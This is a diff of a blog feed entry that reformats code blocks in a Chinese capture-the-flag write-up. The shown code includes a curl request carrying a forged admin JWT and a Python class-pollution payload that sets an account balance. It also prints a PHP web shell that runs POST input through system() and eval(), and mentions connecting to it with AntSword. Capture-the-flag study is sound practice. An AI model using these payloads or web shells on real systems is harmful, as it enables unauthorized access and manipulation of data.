@@ -45,13 +45,13 @@
 <p>终于登录为了admin，然后还是买不了。通过改包或者抢米都改不了余额</p>
 <p>我们再看上图，<code>uid</code> 在 Header 里，使用POST /api/upadte，下面还有json大括号</p>
 <p>所以尝试python原型链污染，在抢米的时候抓包得知变量叫balance</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>xiaochai_123@binarios:~$ curl -X POST <span style="color:#e6db74">&#34;http://forward.vidar.club:30452//api/update&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzcyNzA4Nzg4fQ.BZjJ7f_603GwNzZFWxWCyY7R36PItLaB3wgqPHy3vKo&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;uid: 1413914&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d <span style="color:#e6db74">&#34;{\&#34;__init__\&#34;: {\&#34;__globals__\&#34;: {\&#34;balance\&#34;: 2000000}}}&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;is_admin&#34;</span>:true,<span style="color:#e6db74">&#34;msg&#34;</span>:<span style="color:#e6db74">&#34;System Access Granted&#34;</span>,<span style="color:#e6db74">&#34;user_info&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;balance&#34;</span>:2000000,<span style="color:#e6db74">&#34;role&#34;</span>:<span style="color:#e6db74">&#34;user&#34;</span>,<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span><span style="color:#f92672">}}</span>
-</span></span><span style="display:flex;"><span>xiaochai_123@binarios:~$
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl">xiaochai_123@binarios:~$ curl -X POST <span class="s2">&#34;http://forward.vidar.club:30452//api/update&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="se"></span>  -H <span class="s2">&#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzcyNzA4Nzg4fQ.BZjJ7f_603GwNzZFWxWCyY7R36PItLaB3wgqPHy3vKo&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="se"></span>  -H <span class="s2">&#34;uid: 1413914&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="se"></span>  -H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="se"></span>  -d <span class="s2">&#34;{\&#34;__init__\&#34;: {\&#34;__globals__\&#34;: {\&#34;balance\&#34;: 2000000}}}&#34;</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="o">{</span><span class="s2">&#34;is_admin&#34;</span>:true,<span class="s2">&#34;msg&#34;</span>:<span class="s2">&#34;System Access Granted&#34;</span>,<span class="s2">&#34;user_info&#34;</span>:<span class="o">{</span><span class="s2">&#34;balance&#34;</span>:2000000,<span class="s2">&#34;role&#34;</span>:<span class="s2">&#34;user&#34;</span>,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;admin&#34;</span><span class="o">}}</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">xiaochai_123@binarios:~$
 </span></span></code></pre></div><p>现在我们就有钱直接买flag啦<picture><img class="img-fluid " alt="image-20260305185510259" src="https://decimo.top/images/screenshoots/2026-03/image-20260305185510259.png?v=e92a0031ca6ec847987fe1dcc30fc702" loading="lazy" width="1460" height="984" />
 </picture>
 
@@ -89,23 +89,23 @@
 
 </p>
 <p>发现php代码</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;show&#39;</span>])) {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$pass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;c4d038b4bed09fdb1471ef51ec3a32cd&#39;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;key&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;key&#39;</span>]) <span style="color:#f92672">===</span> $pass) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>])) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>($_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
-</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">elseif</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;code&#39;</span>])) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#39;code&#39;</span>]);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">404</span>);
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;show&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nv">$pass</span> <span class="o">=</span> <span class="s1">&#39;c4d038b4bed09fdb1471ef51ec3a32cd&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nx">http_response_code</span><span class="p">(</span><span class="mi">404</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>找出passwd，其md5是c4d038b4bed09fdb1471ef51ec3a32cd</p>
 <p>只要passwd对了就拿到shell</p>
 <p>用神秘小脚本爆破一下简单的字符集，看到源码是114514</p>
@@ -124,6 +124,10 @@
 </p>
 <p>ok,成功连接，看到它的钱数，我们给他改多就好了</p>
 <p><picture><img class="img-fluid " alt="AntSword_ZSRbr7jujF" src="https://decimo.top/images/screenshoots/2026-02/AntSword_ZSRbr7jujF.png?v=9b1bca972f6759646f94fef0567a86bc" loading="lazy" width="1545" height="1041" />
+</picture>
+
+</p>
+<p><picture><img class="img-fluid " alt="image-20260222000829979" src="https://decimo.top/images/screenshoots/2026-02/image-20260222000829979.png?v=045a4a3fd643548996896a9cf67cfac3" loading="lazy" width="1300" height="558" />
 </picture>
 
 </p>]]></description>
